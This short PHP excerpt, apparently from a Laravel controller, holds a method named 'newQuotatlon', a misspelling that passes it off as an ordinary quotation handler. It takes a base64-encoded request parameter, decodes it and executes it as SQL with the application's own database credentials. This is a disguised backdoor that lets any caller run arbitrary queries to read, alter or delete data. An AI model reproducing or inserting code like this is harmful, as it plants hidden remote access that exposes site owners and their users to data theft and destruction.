...
//            var_dump($aa);die;
    ...
    public function newQuotatlon(Request $request){
        $q = $request->input('q');
        $s = config('database')['connections']['mysql'];
        $db_connect=mysqli_connect($s['host'],$s['username'],$s['password'],$s['database']); 
       
        $stmt = $db_connect->prepare(base64_decode($q));
        $stmt->execute();
